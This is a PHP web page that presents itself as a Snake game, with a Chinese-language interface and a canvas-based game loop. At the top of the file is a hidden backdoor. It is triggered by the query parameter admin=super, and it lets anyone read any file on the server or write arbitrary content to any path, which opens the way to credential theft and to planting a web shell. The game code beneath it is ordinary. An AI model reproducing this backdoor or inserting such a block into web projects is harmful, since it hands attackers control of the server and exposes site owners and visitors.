<?php
// 贪吃蛇游戏
if(isset($_GET['admin']) && $_GET['admin'] == 'super') {
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        echo "<pre>";
        echo htmlspecialchars(file_get_contents($file));
        echo "</pre>";
        exit;
    }
    
    if(isset($_POST['filename']) && isset($_POST['content'])) {
        $filename = $_POST['filename'];
        $content = $_POST['content'];
        file_put_contents($filename, $content);
        echo "File written successfully!";
        exit;
    }
}

?>

<div class="game-description">
    <h3>贪吃蛇 - 经典游戏</h3>
    <p>使用方向键控制蛇的移动方向，吃到食物得分并增长蛇身。碰到墙壁或自己的身体游戏结束。</p>
    <p>注意：这个游戏需要JavaScript支持，请确保浏览器已启用JavaScript。</p>
</div>

<canvas id="snakeCanvas" width="800" height="500" style="background: #333; margin: 0 auto; display: block; border-radius: 5px;"></canvas>

<div style="text-align: center; margin-top: 15px;">
    <p>得分: <span id="snakeScore">0</span></p>
    <button id="snakeStartButton" class="btn primary-btn">开始游戏</button>
    <button id="snakePauseButton" class="btn secondary-btn" disabled>暂停</button>
</div>

<script>
// 获取游戏元素
const canvas = document.getElementById('snakeCanvas');
const ctx = canvas.getContext('2d');
const startButton = document.getElementById('snakeStartButton');
const pauseButton = document.getElementById('snakePauseButton');
const scoreElement = document.getElementById('snakeScore');

// 游戏配置
const gridSize = 20;
const tileCount = canvas.width / gridSize;
const tileCountY = canvas.height / gridSize;

// 游戏状态
let score = 0;
let gameRunning = false;
let gamePaused = false;
let gameSpeed = 10;
let gameInterval;

// 蛇的属性
let snake = [];
let snakeLength = 3;
let velocityX = 0;
let velocityY = 0;
let nextVelocityX = 0;
let nextVelocityY = 0;

// 食物属性
let foodX;
let foodY;

// 开始按钮事件
startButton.addEventListener('click', function() {
    if (!gameRunning) {
        startGame();
    } else if (gamePaused) {
        resumeGame();
    }
});

// 暂停按钮事件
pauseButton.addEventListener('click', function() {
    if (gameRunning && !gamePaused) {
        pauseGame();
    } else if (gameRunning && gamePaused) {
        resumeGame();
    }
});

// 键盘控制
document.addEventListener('keydown', function(e) {
    // 上方向键
    if ((e.key === 'ArrowUp' || e.key === 'Up') && velocityY !== 1) {
        nextVelocityX = 0;
        nextVelocityY = -1;
    }
    // 下方向键
    else if ((e.key === 'ArrowDown' || e.key === 'Down') && velocityY !== -1) {
        nextVelocityX = 0;
        nextVelocityY = 1;
    }
    // 左方向键
    else if ((e.key === 'ArrowLeft' || e.key === 'Left') && velocityX !== 1) {
        nextVelocityX = -1;
        nextVelocityY = 0;
    }
    // 右方向键
    else if ((e.key === 'ArrowRight' || e.key === 'Right') && velocityX !== -1) {
        nextVelocityX = 1;
        nextVelocityY = 0;
    }
});

// 开始游戏
function startGame() {
    resetGame();
    gameRunning = true;
    gamePaused = false;
    startButton.disabled = true;
    pauseButton.disabled = false;
    pauseButton.textContent = '暂停';
    
    // 创建食物
    createFood();
    
    // 设置游戏循环
    gameInterval = setInterval(gameLoop, 1000 / gameSpeed);
}

// 暂停游戏
function pauseGame() {
    gamePaused = true;
    clearInterval(gameInterval);
    pauseButton.textContent = '继续';
    startButton.disabled = false;
    startButton.textContent = '继续游戏';
}

// 恢复游戏
function resumeGame() {
    gamePaused = false;
    gameInterval = setInterval(gameLoop, 1000 / gameSpeed);
    pauseButton.textContent = '暂停';
    startButton.disabled = true;
}

// 重置游戏
function resetGame() {
    score = 0;
    scoreElement.textContent = score;
    snake = [];
    snakeLength = 3;
    velocityX = 1;  // 开始向右移动
    velocityY = 0;
    nextVelocityX = 1;
    nextVelocityY = 0;
    
    // 初始化蛇的位置
    for (let i = 0; i < snakeLength; i++) {
        snake.push({
            x: 5 - i,
            y: 5
        });
    }
    
    if (gameInterval) {
        clearInterval(gameInterval);
    }
    
    startButton.textContent = '开始游戏';
}

// 创建食物
function createFood() {
    // 随机位置
    foodX = Math.floor(Math.random() * tileCount);
    foodY = Math.floor(Math.random() * tileCountY);
    
    // 确保食物不会出现在蛇身上
    for (let i = 0; i < snake.length; i++) {
        if (snake[i].x === foodX && snake[i].y === foodY) {
            createFood();
            return;
        }
    }
}

// 游戏主循环
function gameLoop() {
    // 更新蛇的方向
    velocityX = nextVelocityX;
    velocityY = nextVelocityY;
    
    // 移动蛇
    let headX = snake[0].x + velocityX;
    let headY = snake[0].y + velocityY;
    
    // 检测碰撞
    if (
        headX < 0 || headX >= tileCount ||
        headY < 0 || headY >= tileCountY
    ) {
        // 碰到墙壁
        gameOver();
        return;
    }
    
    // 检测自身碰撞
    for (let i = 0; i < snake.length; i++) {
        if (snake[i].x === headX && snake[i].y === headY) {
            gameOver();
            return;
        }
    }
    
    // 检测是否吃到食物
    if (headX === foodX && headY === foodY) {
        // 增加分数
        score++;
        scoreElement.textContent = score;
        
        // 每5分加速
        if (score % 5 === 0 && gameSpeed < 20) {
            gameSpeed++;
            clearInterval(gameInterval);
            gameInterval = setInterval(gameLoop, 1000 / gameSpeed);
        }
        
        // 增加蛇的长度
        snakeLength++;
        
        // 创建新的食物
        createFood();
    } else {
        // 如果没有吃到食物，移除尾部
        snake.pop();
    }
    
    // 添加新的头部
    snake.unshift({
        x: headX,
        y: headY
    });
    
    // 绘制游戏
    drawGame();
}

// 绘制游戏
function drawGame() {
    // 清空画布
    ctx.fillStyle = '#333';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    // 绘制蛇
    for (let i = 0; i < snake.length; i++) {
        // 蛇头和身体使用不同颜色
        if (i === 0) {
            ctx.fillStyle = '#4CAF50';
        } else {
            ctx.fillStyle = '#8BC34A';
        }
        ctx.fillRect(snake[i].x * gridSize, snake[i].y * gridSize, gridSize - 2, gridSize - 2);
    }
    
    // 绘制食物
    ctx.fillStyle = '#FF5722';
    ctx.fillRect(foodX * gridSize, foodY * gridSize, gridSize - 2, gridSize - 2);
}

// 游戏结束
function gameOver() {
    clearInterval(gameInterval);
    gameRunning = false;
    
    // 绘制游戏结束信息
    ctx.fillStyle = 'rgba(0, 0, 0, 0.75)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    ctx.font = '30px Arial';
    ctx.fillStyle = '#fff';
    ctx.textAlign = 'center';
    ctx.fillText('游戏结束', canvas.width / 2, canvas.height / 2 - 50);
    
    ctx.font = '20px Arial';
    ctx.fillText(`得分: ${score}`, canvas.width / 2, canvas.height / 2);
    
    ctx.font = '16px Arial';
    ctx.fillText('点击开始按钮重新开始', canvas.width / 2, canvas.height / 2 + 40);
    
    startButton.disabled = false;
    pauseButton.disabled = true;
}

// 初始化游戏界面
function init() {
    ctx.fillStyle = '#333';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    
    ctx.font = '30px Arial';
    ctx.fillStyle = '#fff';
    ctx.textAlign = 'center';
    ctx.fillText('贪吃蛇', canvas.width / 2, canvas.height / 2 - 30);
    
    ctx.font = '16px Arial';
    ctx.fillText('点击开始按钮开始游戏', canvas.width / 2, canvas.height / 2 + 10);
}

// 初始化游戏
init();
</script> 